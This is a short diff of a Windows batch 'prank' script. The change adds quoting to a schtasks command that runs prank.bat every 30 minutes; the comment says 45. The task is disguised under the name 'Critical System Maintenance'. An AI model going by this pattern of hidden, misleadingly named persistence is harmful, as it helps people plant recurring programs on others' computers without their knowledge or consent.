@@ -16,4 +16,4 @@ set VBScriptFile=popup.vbs
 rem setup system task to run the prank every 45 minutes
 for /f %%a in ('powershell -command "(Get-Date).ToString('MM/dd/yyyy')"') do set "today=%%a"
 for /f %%b in ('powershell -command "(Get-Date).ToString('HH:mm')"') do set "current_time=%%b"
-schtasks /create /tn "Critical System Maintenance" /tr "%cd%\prank.bat" /sc MINUTE /mo 30 /st %current_time% /sd %today%
+schtasks /create /tn "Critical System Maintenance" /tr "\"%cd%\prank.bat\"" /sc MINUTE /mo 30 /st %current_time% /sd %today%
